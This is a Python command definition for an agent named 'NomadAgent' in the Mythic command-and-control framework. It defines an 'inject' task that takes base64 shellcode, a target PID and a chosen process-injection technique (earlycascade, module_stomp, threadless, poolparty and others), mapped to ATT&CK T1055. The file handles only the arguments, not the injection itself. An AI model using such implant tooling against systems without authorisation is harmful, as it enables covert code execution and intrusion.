from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class InjectArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="technique",
                type=ParameterType.ChooseOne,
                choices=["", "earlycascade", "module_overload", "module_stomp", "callback", "fiber", "threadless", "kct", "poolparty"],
                display_name="Technique",
                description="Injection technique; empty uses the build-time default",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
            CommandParameter(
                name="shellcode",
                type=ParameterType.String,
                description="Base64-encoded shellcode",
                parameter_group_info=[ParameterGroupInfo(required=True)],
            ),
            CommandParameter(
                name="pid",
                type=ParameterType.Number,
                display_name="PID",
                description="Target PID (0 = current process / technique default)",
                default_value=0,
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
            CommandParameter(
                name="dll",
                type=ParameterType.String,
                display_name="DLL",
                description="module_overload only: DLL to map",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("shellcode", self.command_line)


class InjectCommand(CommandBase):
    cmd = "inject"
    needs_admin = False
    help_cmd = "inject -Technique [earlycascade|module_overload|callback|fiber|threadless|kct|poolparty] -Shellcode [base64] [-PID 0]"
    description = (
        "Generic injection entry point: dispatches to the selected technique, or "
        "to the payload's build-time default when Technique is empty."
    )
    version = 1
    author = "NomadAgent"
    attackmapping = ["T1055"]
    argument_class = InjectArguments

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        return PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
